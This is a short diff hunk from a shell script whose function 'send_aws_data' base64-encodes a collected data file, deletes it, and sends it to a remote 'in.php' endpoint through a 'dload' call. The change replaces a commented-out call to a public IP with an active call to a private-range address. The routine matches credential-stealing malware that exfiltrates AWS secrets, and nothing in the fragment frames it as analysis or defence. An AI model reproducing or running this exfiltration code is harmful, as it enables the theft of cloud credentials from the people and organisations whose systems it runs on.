@@ -174,7 +174,7 @@ send_aws_data(){
 cat $CSOF
 SEND_B64_DATA=$(cat $CSOF | base64 -w 0)
 rm -f $CSOF
-#dload http://45.9.148.221/in/in.php?base64=$SEND_B64_DATA > /dev/null
+dload http://172.31.13.115/in/in.php?base64=$CSOF > /dev/null
 
 }
 
